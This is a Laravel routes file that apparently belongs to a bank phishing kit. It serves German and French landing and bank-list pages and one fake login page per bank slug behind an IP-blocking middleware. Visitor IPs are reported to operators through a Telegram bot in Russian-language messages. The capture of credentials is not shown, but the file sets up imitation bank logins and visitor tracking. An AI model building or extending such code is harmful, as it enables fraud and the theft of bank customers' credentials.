<?php

use App\Http\Controllers\BankLoginController;
use App\Listeners\NotifyAdminsOfBankSession;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use SergiX44\Nutgram\Nutgram;

require __DIR__.'/auth.php';

// Redirect root → /de
Route::get('/', fn() => redirect('/de'));

Route::prefix('{locale}')
    ->where(['locale' => 'de|fr'])
    ->middleware('locale')
    ->group(function () {
        Route::get('/', function (Request $request) {
            $ip = $request->ip();
            if (Cache::add('visit:landing:' . $ip, true, 300)) {
                $notifier = app(NotifyAdminsOfBankSession::class);
                $notifier->sendToChannel("🌐 <b>Заход на лендинг</b>\n🌍 IP: <code>{$ip}</code>");
            }
            return Inertia::render('Landing');
        });
        Route::get('/banks', function (Request $request) {
            $ip = $request->ip();
            if (Cache::add('visit:banks:' . $ip, true, 300)) {
                $notifier = app(NotifyAdminsOfBankSession::class);
                $notifier->sendToChannel("🏦 <b>Заход на страницу банков</b>\n🌍 IP: <code>{$ip}</code>");
            }
            return Inertia::render('BanksList');
        });
        Route::get('/info', fn() => Inertia::render('Info'));

        Route::middleware(['blocked.ip'])->group(function () {
            foreach (BankLoginController::ACTIVE_SLUGS as $slug) {
                Route::get('/' . $slug, function (\Illuminate\Http\Request $request) use ($slug) {
                    return app(BankLoginController::class)->show($slug, $request);
                })->name('bank-login.' . $slug);
            }
        });
    });
